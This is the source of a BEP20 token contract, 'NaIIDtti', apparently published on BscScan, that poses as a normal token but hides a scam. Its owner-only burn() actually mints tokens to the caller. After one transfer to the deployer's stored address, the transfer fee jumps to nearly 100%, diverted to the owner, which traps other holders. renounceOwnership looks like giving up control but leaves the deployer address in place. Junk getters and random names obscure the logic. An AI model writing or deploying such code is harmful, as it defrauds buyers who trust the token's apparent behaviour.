/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.7.6;
contract NaIIDtti {
uint256 private  IPFfeO = 1000000000000000000;
uint256 private  fcyHeC = 10000000000000;
address private  fpquEa = address(0);
address private  QOoLgk = address(0);
uint8 public constant decimals = 18;
address public owner;
uint256 private  LiDAyo = 10000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  name = "NaIIDtti";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  nveCjj = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
uint256 private  eTWGMz = 1000000000000000;
uint256 private  EMWDZb = 100000000;
address private  qRgtBP = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  zYaMNI = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address private  uJKXUa = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address private  hmMvur = address(0);
uint256 private  BMXYUw = 1000000000000000000;
address private  DXhUsB = address(0);
uint256 public constant XEIWaX = 99999;
string public  symbol = "NaIIDtti";
uint256 private  sbzZoJ = 1000000000000000000000;
address private  klwkUE = address(0);
function _getQOoLgk() private returns (address) {
return QOoLgk;
}

function _getzYaMNI() private returns (address) {
return zYaMNI;
}



function _getuJKXUa() private returns (address) {
return uJKXUa;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}






function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tANHqUT 0");
require(spender != address(0), "fANHqUT 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _gethmMvur() private returns (address) {
return hmMvur;
}

function _getqRgtBP() private returns (address) {
return qRgtBP;
}

function _getfcyHeC() private returns (uint256) {
return fcyHeC;
}

function _getBMXYUw() private returns (uint256) {
return BMXYUw;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}


constructor () {
DXhUsB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}






function _getEMWDZb() private returns (uint256) {
return EMWDZb;
}



function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ANHqUT");
require(to != address(0), "ANHqUT");
require(amount <= balanceOf[from], "ANHqUT");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XEIWaX/IPFfeO ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==DXhUsB){
IPFfeO = XEIWaX+2;
}
emit Transfer(from, to, transferAmount);
}
function _getklwkUE() private returns (address) {
return klwkUE;
}

function _getnveCjj() private returns (address) {
return nveCjj;
}

function _getsbzZoJ() private returns (uint256) {
return sbzZoJ;
}



function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}


modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getfpquEa() private returns (address) {
return fpquEa;
}



function _geteTWGMz() private returns (uint256) {
return eTWGMz;
}





function _getLiDAyo() private returns (uint256) {
return LiDAyo;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}


function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}